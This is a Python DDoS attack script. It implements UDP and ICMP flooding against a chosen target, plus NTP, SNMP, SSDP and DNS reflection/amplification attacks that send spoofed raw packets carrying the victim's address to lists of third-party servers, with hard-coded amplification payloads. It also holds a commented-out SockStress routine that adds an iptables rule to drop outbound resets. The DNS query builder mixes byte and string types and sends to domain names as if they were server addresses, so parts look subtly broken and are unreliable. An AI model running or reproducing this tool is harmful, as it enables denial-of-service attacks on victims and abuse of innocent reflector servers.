import sys
import time
import socket
import random
import signal
import struct
import threading
import scapy.layers.inet
from pinject import IP, UDP
from scapy.sendrecv import send


def calc(n, d, unit=''):
    suffix = {
        0: '',
        1: 'K',
        2: 'M',
        3: 'G',
        4: 'T'}
    i = 0
    r = float(n)
    while r/d >= 1:
        r = r/d
        i += 1
    return '{:.2f}{}{}'.format(r, suffix[i], unit)


def on_signal(sig, frame):
    print('\n')
    # print('signal:%d ' % sig + str(frame))
    print('Pressed Ctrl+C, terminated.')
    sys.exit()


class ATTACK:
    def __init__(self, args):
        self.args = args
        self.start_time = 0
        self.elapsed_time = 0
        self.packets = 0   # Number of packets sent to target
        self.bytes = 0     # Number of bytes sent to target
        # self.lock = threading.Lock()
        try:
            # thread_num = 1
            # for i in range(thread_num):
            #     t = threading.Thread(target=self.udp_flood)
            #     t.start()
            signal.signal(signal.SIGINT, on_signal)
            {
                1: self.udp_flood,
                2: self.icmp_flood,
                3: self.ntp_amplification,
                4: self.snmp_amplification,
                5: self.ssdp_amplification,
                6: self.dns_amplification
            }[self.args.type]()
        except Exception as err:
            print('\nError:', str(err))
        finally:
            sys.exit()

    def show_stats(self):
        attack = (
            '     Duration  '
            '|    Sent       '
            '|    Traffic    '
            '|    Packet/s   '
            '|     Bit/s     '
            '\n{}').format('-' * 79)
        self.start_time = time.time()
        print(attack)
        fmt = '{:^15}|{:^15}|{:^15}|{:^15}|{:^15}'
        while True:
            self.elapsed_time = time.time() - self.start_time
            bps = (self.bytes * 8) / self.elapsed_time
            pps = self.packets / self.elapsed_time
            out = fmt.format(
                '{:.2f}s'.format(self.elapsed_time),
                calc(self.packets, 1000),
                calc(self.bytes, 1024, 'B'), calc(pps, 1000, 'pps'), calc(bps, 1000, 'bps'))
            print('\r{}{}'.format(out, ' '*(75-len(out))), end='', flush=True)
            time.sleep(1)

    def udp_flood(self):
        print('\n' + ' ' * 23 + 'UDP Flooding on %s:%d\n' % (self.args.target_ip, self.args.target_port))
        t = threading.Thread(target=self.show_stats, daemon=True)
        t.start()
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        payload_bytes = len(payload)
        while True:
            client.sendto(payload, (self.args.target_ip, self.args.target_port))
            self.packets = self.packets + 1
            self.bytes = self.bytes + payload_bytes

    def icmp_flood(self):
        packet = scapy.layers.inet.IP(dst=self.args.target_ip) / scapy.layers.inet.ICMP()
        packet_bytes = len(packet)
        while True:
            send(packet, verbose=False)
            self.packets = self.packets + 1
            self.bytes = self.bytes + packet_bytes

    # def sock_stress(self):
    #     # Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections
    #     os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + self.args.target_ip + ' -j DROP')
    #     while True:
    #             x = random.randint(0, 65535)
    #             response = sr1(IP(dst=self.args.target_ip) /
    #                            TCP(dport=self.args.target_port, sport=x, flags='S'), timeout=1, verbose=0)
    #             send(IP(dst=self.args.target_ip) /
    #                  TCP(dport=self.args.target_port, sport=x, flags='A', window=0, ack=(response[TCP].seq + 1)) /
    #                  '\x00\x00', verbose=0)

    def ntp_amplification(self):
        print('\n' + ' ' * 23 + 'NTP Reflecting on %s:%d\n' % (self.args.target_ip, 123))
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        payload = ('\x17\x00\x02\x2a'+'\x00'*4)
        ntp_server_list = []
        for ntp_server in open(self.args.file, "r"):
            ntp_server = ntp_server.strip()
            if ntp_server != "":
                ntp_server_list.append(ntp_server)
        for ntp_server in ntp_server_list:
            udp = UDP(random.randint(1, 65535), 123, payload).pack(self.args.target_ip, ntp_server)
            ip = IP(self.args.target_ip, ntp_server, udp, proto=socket.IPPROTO_UDP).pack()
            sock.sendto(ip + udp + payload, (ntp_server, 123))
            # send(scapy.layers.inet.IP(dst=self.args, src=self.args.target_ip) /
            #      (UDP(sport=52816) /
            #       NTP(version=2, mode=7, stratum=0, poll=3, precision=42)))

    def snmp_amplification(self):
        print('\n' + ' ' * 23 + 'SNMP Reflecting on %s:%d\n' % (self.args.target_ip, 161))
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        payload = ('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
                   '\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
                   '\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
                   '\x01\x02\x01\x05\x00')
        snmp_server_list = []
        for snmp_server in open(self.args.file, "r"):
            snmp_server = snmp_server.strip()
            if snmp_server != "":
                snmp_server_list.append(snmp_server)
        for snmp_server in snmp_server_list:
            udp = UDP(random.randint(1, 65535), 161, payload).pack(self.args.target_ip, snmp_server)
            ip = IP(self.args.target_ip, snmp_server, udp, proto=socket.IPPROTO_UDP).pack()
            sock.sendto(ip + udp + payload, (snmp_server, 161))

    def ssdp_amplification(self):
        print('\n' + ' ' * 23 + 'SSDP Reflecting on %s:%d\n' % (self.args.target_ip, 1900))
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        payload = ('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
                   'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
        ssdp_server_list = []
        for ssdp_server in open(self.args.file, "r"):
            ssdp_server = ssdp_server.strip()
            if ssdp_server != "":
                ssdp_server_list.append(ssdp_server)
        for ssdp_server in ssdp_server_list:
            udp = UDP(random.randint(1, 65535), 1900, payload).pack(self.args.target_ip, ssdp_server)
            ip = IP(self.args.target_ip, ssdp_server, udp, proto=socket.IPPROTO_UDP).pack()
            sock.sendto(ip + udp + payload, (ssdp_server, 1900))


    def get_qname(self, domain):
        labels = domain.split('.')
        qname = ''
        for label in labels:
            if len(label):
                qname += struct.pack('B', len(label)) + label
        return qname

    def get_dns_query(self, domain):
        id = struct.pack('H', random.randint(0, 65535))
        qname = self.get_qname(domain)
        payload = ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
                   '{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
                   '\x00\x00\x00\x00\x00\x00').format(id, qname)
        return payload

    def dns_amplification(self):
        print('\n' + ' ' * 23 + 'DNS Reflecting on %s:%d\n' % (self.args.target_ip, 53))
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        domain_list = []
        for domain in open(self.args.file, "r"):
            domain = domain.strip()
            if domain != "":
                domain_list.append(domain)
        for domain in domain_list:
            payload = self.get_dns_query(domain)
            udp = UDP(random.randint(1, 65535), 53, payload).pack(self.args.target_ip, domain)
            ip = IP(self.args.target_ip, domain, udp, proto=socket.IPPROTO_UDP).pack()
            sock.sendto(ip + udp + payload, (domain, 53))
